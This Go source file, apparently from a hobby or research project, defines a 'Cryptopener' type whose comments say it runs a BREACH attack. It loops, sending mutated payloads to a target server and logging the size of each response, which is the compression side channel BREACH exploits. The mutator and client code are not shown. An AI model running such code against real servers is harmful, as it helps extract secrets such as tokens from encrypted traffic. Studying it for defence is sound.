package cryptopener

import (
	"log"
	"io/ioutil"
	"os"

	client "github.com/larikuistio/cryptopener/client"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken []string
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte) {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	log.Printf("Filesize: %d", size)
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	for {
		// create new payload
		payload, _ := p.mutator.NewPayload(false)
		log.Printf("Sending payload: %s", string(payload))
		// send payload into a socket and then response into channel
		response := p.client.SendMessage(string(payload), "#")
		p.analyseResponse(response)
	}
}
